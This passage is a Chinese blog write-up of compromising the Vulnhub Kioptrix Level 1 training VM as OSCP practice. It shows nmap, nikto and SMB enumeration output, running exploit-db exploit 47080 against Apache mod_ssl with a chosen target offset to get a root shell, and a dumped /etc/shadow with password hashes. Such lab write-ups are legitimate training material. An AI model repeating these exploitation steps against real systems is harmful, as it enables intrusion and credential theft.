<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TonghuaRoot&#39;s BloG. - Cyber security enthusiast, not Hacker.</title>
  
  <subtitle>Know it, then Hack it!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://tonghuaroot.com/"/>
  <updated>2019-10-13T12:32:27.434Z</updated>
  <id>https://tonghuaroot.com/</id>
  
  <author>
    <name>TonghuaRoot</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>OSCP:Vulnhub Kioptrix Level 1 Writeup</title>
    <link href="https://tonghuaroot.com/2019/10/13/OSCP-Vulnhub-Kioptrix-Level-1-Writeup/"/>
    <id>https://tonghuaroot.com/2019/10/13/OSCP-Vulnhub-Kioptrix-Level-1-Writeup/</id>
    <published>2019-10-13T04:21:52.000Z</published>
    <updated>2019-10-13T12:32:27.434Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>准备写一个撸Vulnhub的系列教程，从Kioptrix系列开始，相关链接在这里：<a href="https://www.vulnhub.com/series/kioptrix,8/" target="_blank" rel="noopener">https://www.vulnhub.com/series/kioptrix,8/</a>，这篇文章先从<a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/" target="_blank" rel="noopener">Kioptrix: Level 1 (#1)</a>开始了。</p><p>OSCP的在线lab太卡了，先做Vulnhub上头的镜像练手。</p><h2 id="0x01-渗透思路"><a href="#0x01-渗透思路" class="headerlink" title="0x01 渗透思路"></a>0x01 渗透思路</h2><p>常规思路，两个入口，扫描服务，识别版本，上exploit code梭哈。</p><ul><li>Apache mod_ssl 2.8.4 Remote Buffer Overflow</li><li>Samba 2.2.1a Remote Code Execution</li></ul><h2 id="0x02-用到的工具"><a href="#0x02-用到的工具" class="headerlink" title="0x02 用到的工具"></a>0x02 用到的工具</h2><h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">netdiscover</span><br><span class="line">nmap</span><br><span class="line">DirBuster</span><br><span class="line">wordlists</span><br><span class="line">rpcclient</span><br><span class="line">smbclient</span><br><span class="line">enum4linux</span><br><span class="line">nikto</span><br><span class="line">searchsploit</span><br><span class="line">metasploit</span><br></pre></td></tr></table></figure><h3 id="exploits"><a href="#exploits" class="headerlink" title="exploits"></a>exploits</h3><ul><li><a href="https://www.exploit-db.com/exploits/10" target="_blank" rel="noopener">Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution</a></li><li><a href="https://www.exploit-db.com/exploits/47080" target="_blank" rel="noopener">Apache mod_ssl &lt; 2.8.7 OpenSSL - ‘OpenFuckV2.c’ Remote Buffer Overflow (2)</a></li></ul><h2 id="0x03-渗透过程"><a href="#0x03-渗透过程" class="headerlink" title="0x03 渗透过程"></a>0x03 渗透过程</h2><p>靶机起来大概长这样：</p><p><img src="71707904C61C482A989528E3ADC3D4B8" alt="image"></p><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>netdiscover内网主机发现，原理就是ARP扫描，拿到内网IP。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0</span><br></pre></td></tr></table></figure><p><img src="8E46EECC67BA4640AD32064F48D4B8EC" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Currently scanning: 172.16.180.0/16   |   Screen View: Unique Hosts            </span><br><span class="line">                                                                               </span><br><span class="line">5 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 300                </span><br><span class="line">_____________________________________________________________________________</span><br><span class="line">  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">192.168.199.1   d4:ee:07:59:a6:ec      2     120  HIWIFI Co., Ltd.             </span><br><span class="line">192.168.199.126 90:f0:52:68:7a:ac      1      60  MEIZU Technology Co., Ltd.   </span><br><span class="line">192.168.199.219 98:22:ef:fc:5c:13      1      60  Liteon Technology Corporation</span><br><span class="line">192.168.199.230 00:0c:29:7c:3a:16      1      60  VMware, Inc.</span><br></pre></td></tr></table></figure><p>192.168.199.1是路由器，192.168.199.126是邻居的手机，192.168.199.219不知道是个啥，回头再看(emm,namp扫了下好像是邻居的笔记本)，所以此次的目标就是192.168.199.230了。</p><p>nmap走一波:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -sV -T4 -A -oX Kioptrix_level_1.xml 192.168.199.230</span><br><span class="line">nmap -p- -sV -T4 -Pn  -oG Kioptrix_level_1.txt  192.168.199.219 | grep &quot;open&quot;</span><br></pre></td></tr></table></figure><p>参数解读：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-p &lt;port ranges&gt;: Only scan specified ports，-p-就是扫描1-65535全端口</span><br><span class="line">-sV: Probe open ports to determine service/version info</span><br><span class="line">-T[0-6]: Set timing template (higher is faster)，控制扫描速度啥的</span><br><span class="line">-A: Enables OS detection and Version detection</span><br><span class="line">-oN/-oX/-oS/-oG &lt;file&gt;: Output scan results in normal, XML, s|&lt;rIpt kIddi3,and Grepable format, respectively, to the given filename. ，-oX就是输出xml格式后面跟文名</span><br><span class="line">-Pn 不ping了，直接扫，避免有的机器禁ping而扫不到</span><br></pre></td></tr></table></figure><p><img src="6EEEA0C9CA744151BFE87847AE3932B1" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -p- -sV -T4 -A -oX Kioptrix_level_1.xml 192.168.199.230</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-13 03:46 EDT</span><br><span class="line">Nmap scan report for 192.168.199.230</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 65529 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)</span><br><span class="line">|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)</span><br><span class="line">|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)</span><br><span class="line">|_sshv1: Server supports SSHv1</span><br><span class="line">80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-title: Test Page for the Apache Web Server on Red Hat Linux</span><br><span class="line">111/tcp  open  rpcbind     2 (RPC #100000)</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)</span><br><span class="line">443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-title: 400 Bad Request</span><br><span class="line">|_ssl-date: 2019-10-13T07:49:52+00:00; +1m50s from scanner time.</span><br><span class="line">| sslv2: </span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers: </span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">1024/tcp open  status      1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:7C:3A:16 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.4</span><br><span class="line">OS details: Linux 2.4.9 - 2.4.18 (likely embedded)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 1m49s</span><br><span class="line">|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.09 ms 192.168.199.230</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 133.02 seconds</span><br><span class="line">root@kali:~#</span><br></pre></td></tr></table></figure><ul><li>22是SSH端口</li><li>80、443是Web端口</li><li>111是RPC service</li><li>139是Samba</li><li>1024也是RPC service</li></ul><h3 id="Apache-mod-ssl-2-8-4-Remote-Buffer-Overflow"><a href="#Apache-mod-ssl-2-8-4-Remote-Buffer-Overflow" class="headerlink" title="Apache mod_ssl 2.8.4 Remote Buffer Overflow"></a>Apache mod_ssl 2.8.4 Remote Buffer Overflow</h3><p>Web目录爆破的字典在这个目录下(也可以用wordlists去翻，这个工具会把常用的字典软链接到/usr/share/wordlists)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/dirbuster/wordlists# ls</span><br><span class="line">apache-user-enum-1.0.txt  directory-list-2.3-medium.txt</span><br><span class="line">apache-user-enum-2.0.txt  directory-list-2.3-small.txt</span><br><span class="line">directories.jbrofuzz      directory-list-lowercase-2.3-medium.txt</span><br><span class="line">directory-list-1.0.txt    directory-list-lowercase-2.3-small.txt</span><br><span class="line">root@kali:/usr/share/dirbuster/wordlists# pwd</span><br><span class="line">/usr/share/dirbuster/wordlists</span><br></pre></td></tr></table></figure><p>nikto扫下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nikto -host 192.168.199.230 -port 80</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.199.230</span><br><span class="line">+ Target Hostname:    192.168.199.230</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2019-10-13 05:30:31 (GMT-4)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">+ Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)</span><br><span class="line">+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.</span><br><span class="line">+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</span><br><span class="line">+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header</span><br><span class="line">+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.</span><br><span class="line">+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.</span><br><span class="line">+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.</span><br><span class="line">+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE </span><br><span class="line">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</span><br><span class="line">+ ///etc/hosts: The server install allows reading of any system file by adding an extra &apos;/&apos; to the URL.</span><br><span class="line">+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).</span><br><span class="line">+ OSVDB-3268: /manual/: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: /manual/: Web server manual found.</span><br><span class="line">+ OSVDB-3268: /icons/: Directory indexing found.</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ OSVDB-3092: /test.php: This might be interesting...</span><br><span class="line">+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.</span><br><span class="line">+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.</span><br><span class="line">+ /shell?cat+/etc/hosts: A backdoor was identified.</span><br><span class="line">+ 8724 requests: 0 error(s) and 30 item(s) reported on remote host</span><br><span class="line">+ End Time:           2019-10-13 05:30:56 (GMT-4) (25 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure><p>定位到漏洞：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.</span><br></pre></td></tr></table></figure><p>基于CVE编号，搜到<a href="https://www.exploit-db.com/exploits/764" target="_blank" rel="noopener">Apache mod_ssl &lt; 2.8.7 OpenSSL - ‘OpenFuckV2.c’ Remote Buffer Overflow (1)</a>，<figure class="highlight plain"><figcaption><span>mod_ssl```可以看到kali上存的利用代码：</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image](4B0E1B8148984280BA397FE3A9CDB6BA)</span><br><span class="line"></span><br><span class="line">![image](D42C0CAE62F54884BCB674D3529D5E2B)</span><br><span class="line"></span><br><span class="line">expoloit比较老了，要装libssl1.0-dev才能编译成功，hhh</span><br></pre></td></tr></table></figure></p><p>apt-get install libssl1.0-dev<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后报了更多的错误，大雾。。</span><br><span class="line"></span><br><span class="line">![image](67548AA04EB44EBDB03415216EF449D3)</span><br><span class="line"></span><br><span class="line">好在找到了一篇文章，提出了解决方法：[Compiling exploit 764.c in 2017 (using libssl-dev 1.1.0f )](https://www.hypn.za.net/blog/2017/08/27/compiling-exploit-764-c-in-2017/)，嗯又报错了，最后换[Apache mod_ssl &lt; 2.8.7 OpenSSL - &apos;OpenFuckV2.c&apos; Remote Buffer Overflow (2)](https://www.exploit-db.com/exploits/47080)弹回shell了。</span><br></pre></td></tr></table></figure></p><p>root@kali:/usr/share/exploitdb/exploits/unix/remote# ./47080 | grep 1.3.20<br>    0x02 - Cobalt Sun 6.0 (apache-1.3.20)<br>    0x27 - FreeBSD (apache-1.3.20)<br>    0x28 - FreeBSD (apache-1.3.20)<br>    0x29 - FreeBSD (apache-1.3.20+2.8.4)<br>    0x2a - FreeBSD (apache-1.3.20_1)<br>    0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)<br>    0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)<br>    0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)<br>    0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1<br>    0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2<br>    0x7e - Slackware Linux 8.0 (apache-1.3.20)<br>    0x86 - SuSE Linux 7.3 (apache-1.3.20)<br>root@kali:/usr/share/exploitdb/exploits/unix/remote#<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">基于nmap的扫描版本1.3.20，以及系统为redhat可以定位到为0x6a、0x6b两个参数，用了0x6b可以成功利用。</span><br><span class="line"></span><br><span class="line">![image](666CCFEC91294074AB84974D9606D3FE)</span><br><span class="line"></span><br><span class="line">Capturing The Flag!</span><br></pre></td></tr></table></figure></p><p>cat /var/mail/root<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image](6F1F635589A24C54B83DFDC6AF5BF9B7)</span><br></pre></td></tr></table></figure></p><p>cat /etc/shadow<br>root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::<br>bin:<em>:14513:0:99999:7:::<br>daemon:</em>:14513:0:99999:7:::<br>adm:<em>:14513:0:99999:7:::<br>lp:</em>:14513:0:99999:7:::<br>sync:<em>:14513:0:99999:7:::<br>shutdown:</em>:14513:0:99999:7:::<br>halt:<em>:14513:0:99999:7:::<br>mail:</em>:14513:0:99999:7:::<br>news:<em>:14513:0:99999:7:::<br>uucp:</em>:14513:0:99999:7:::<br>operator:<em>:14513:0:99999:7:::<br>games:</em>:14513:0:99999:7:::<br>gopher:<em>:14513:0:99999:7:::<br>ftp:</em>:14513:0:99999:7:::<br>nobody:*:14513:0:99999:7:::<br>mailnull:!!:14513:0:99999:7:::<br>rpm:!!:14513:0:99999:7:::<br>xfs:!!:14513:0:99999:7:::<br>rpc:!!:14513:0:99999:7:::<br>rpcuser:!!:14513:0:99999:7:::<br>nfsnobody:!!:14513:0:99999:7:::<br>nscd:!!:14513:0:99999:7:::<br>ident:!!:14513:0:99999:7:::<br>radvd:!!:14513:0:99999:7:::<br>postgres:!!:14513:0:99999:7:::<br>apache:!!:14513:0:99999:7:::<br>squid:!!:14513:0:99999:7:::<br>pcap:!!:14513:0:99999:7:::<br>john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::<br>harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### Samba 2.2.1a Remote Code Execution</span><br><span class="line"></span><br><span class="line">nbtscan扫一下139的samba服务,rpcclient,smbclient空口令连接：</span><br><span class="line"></span><br><span class="line">![image](5F4679C8484844C394A86E792DDB7BD5)</span><br><span class="line"></span><br><span class="line">![image](BFA36B1CE7DB4301AB73985784B7B11D)</span><br></pre></td></tr></table></figure></p><p>root@kali:~# nbtscan 192.168.199.230<br>Doing NBT name scan for addresses from 192.168.199.230</p><h2 id="IP-address-NetBIOS-Name-Server-User-MAC-address"><a href="#IP-address-NetBIOS-Name-Server-User-MAC-address" class="headerlink" title="IP address       NetBIOS Name     Server    User             MAC address      "></a>IP address       NetBIOS Name     Server    User             MAC address      </h2><p>192.168.199.230  KIOPTRIX         <server>  KIOPTRIX         00:00:00:00:00:00<br>root@kali:~# </server></p><p>root@kali:~# rpcclient -U “” 192.168.199.230</p><p>root@kali:~# smbclient -L=”192.168.199.230”<br>Server does not support EXTENDED_SECURITY  but ‘client use spnego = yes’ and ‘client ntlmv2 auth = yes’ is set<br>Anonymous login successful<br>Enter WORKGROUP\root’s password: </p><pre><code>Sharename       Type      Comment---------       ----      -------IPC$            IPC       IPC Service (Samba Server)ADMIN$          IPC       IPC Service (Samba Server)</code></pre><p>Reconnecting with SMB1 for workgroup listing.<br>Server does not support EXTENDED_SECURITY  but ‘client use spnego = yes’ and ‘client ntlmv2 auth = yes’ is set<br>Anonymous login successful</p><pre><code>Server               Comment---------            -------KIOPTRIX             Samba ServerWorkgroup            Master---------            -------MYGROUP              KIOPTRIX</code></pre><p>root@kali:~#<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">enum4linux</span><br><span class="line"></span><br><span class="line">![image](9BCE63D411204A218C577F81F0645F36)</span><br></pre></td></tr></table></figure></p><p>root@kali:~# enum4linux 192.168.199.230<br>Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/" target="_blank" rel="noopener">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Sun Oct 13 04:23:40 2019</p><p> ========================== </p><h1 id="Target-Information"><a href="#Target-Information" class="headerlink" title="|    Target Information    |"></a>|    Target Information    |</h1><p>Target ……….. 192.168.199.230<br>RID Range …….. 500-550,1000-1050<br>Username ……… ‘’<br>Password ……… ‘’<br>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</p><p> ======================================================= </p><h1 id="Enumerating-Workgroup-Domain-on-192-168-199-230"><a href="#Enumerating-Workgroup-Domain-on-192-168-199-230" class="headerlink" title="|    Enumerating Workgroup/Domain on 192.168.199.230    |"></a>|    Enumerating Workgroup/Domain on 192.168.199.230    |</h1><p>[+] Got domain/workgroup name: MYGROUP</p><p> =============================================== </p><h1 id="Nbtstat-Information-for-192-168-199-230"><a href="#Nbtstat-Information-for-192-168-199-230" class="headerlink" title="|    Nbtstat Information for 192.168.199.230    |"></a>|    Nbtstat Information for 192.168.199.230    |</h1><p>Looking up status of 192.168.199.230<br>    KIOPTRIX        <00> -         B <active>  Workstation Service<br>    KIOPTRIX        <03> -         B <active>  Messenger Service<br>    KIOPTRIX        <20> -         B <active>  File Server Service<br>    ..<strong>MSBROWSE</strong>. <01> - <group> B <active>  Master Browser<br>    MYGROUP         <00> - <group> B <active>  Domain/Workgroup Name<br>    MYGROUP         <1d> -         B <active>  Master Browser<br>    MYGROUP         <1e> - <group> B <active>  Browser Service Elections</active></group></1e></active></1d></active></group></00></active></group></01></active></20></active></03></active></00></p><pre><code>MAC Address = 00-00-00-00-00-00</code></pre><p> ======================================== </p><h1 id="Session-Check-on-192-168-199-230"><a href="#Session-Check-on-192-168-199-230" class="headerlink" title="|    Session Check on 192.168.199.230    |"></a>|    Session Check on 192.168.199.230    |</h1><p>[+] Server 192.168.199.230 allows sessions using username ‘’, password ‘’</p><p> ============================================== </p><h1 id="Getting-domain-SID-for-192-168-199-230"><a href="#Getting-domain-SID-for-192-168-199-230" class="headerlink" title="|    Getting domain SID for 192.168.199.230    |"></a>|    Getting domain SID for 192.168.199.230    |</h1><p>Domain Name: MYGROUP<br>Domain Sid: (NULL SID)<br>[+] Can’t determine if host is part of domain or part of a workgroup</p><p> ========================================= </p><h1 id="OS-information-on-192-168-199-230"><a href="#OS-information-on-192-168-199-230" class="headerlink" title="|    OS information on 192.168.199.230    |"></a>|    OS information on 192.168.199.230    |</h1><p>Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.<br>[+] Got OS info for 192.168.199.230 from smbclient:<br>[+] Got OS info for 192.168.199.230 from srvinfo:<br>    KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server<br>    platform_id     :    500<br>    os version      :    4.5<br>    server type     :    0x9a03</p><p> ================================ </p><h1 id="Users-on-192-168-199-230"><a href="#Users-on-192-168-199-230" class="headerlink" title="|    Users on 192.168.199.230    |"></a>|    Users on 192.168.199.230    |</h1><p>Use of uninitialized value $users in print at ./enum4linux.pl line 874.<br>Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.</p><p>Use of uninitialized value $users in print at ./enum4linux.pl line 888.<br>Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.</p><p> ============================================ </p><h1 id="Share-Enumeration-on-192-168-199-230"><a href="#Share-Enumeration-on-192-168-199-230" class="headerlink" title="|    Share Enumeration on 192.168.199.230    |"></a>|    Share Enumeration on 192.168.199.230    |</h1><pre><code>Sharename       Type      Comment---------       ----      -------IPC$            IPC       IPC Service (Samba Server)ADMIN$          IPC       IPC Service (Samba Server)</code></pre><p>Reconnecting with SMB1 for workgroup listing.</p><pre><code>Server               Comment---------            -------KIOPTRIX             Samba ServerWorkgroup            Master---------            -------MYGROUP              KIOPTRIX</code></pre><p>[+] Attempting to map shares on 192.168.199.230<br>//192.168.199.230/IPC$    [E] Can’t understand response:<br>NT_STATUS_NETWORK_ACCESS_DENIED listing *<br>//192.168.199.230/ADMIN$    [E] Can’t understand response:<br>tree connect failed: NT_STATUS_WRONG_PASSWORD</p><p> ======================================================= </p><h1 id="Password-Policy-Information-for-192-168-199-230"><a href="#Password-Policy-Information-for-192-168-199-230" class="headerlink" title="|    Password Policy Information for 192.168.199.230    |"></a>|    Password Policy Information for 192.168.199.230    |</h1><p>[E] Unexpected error 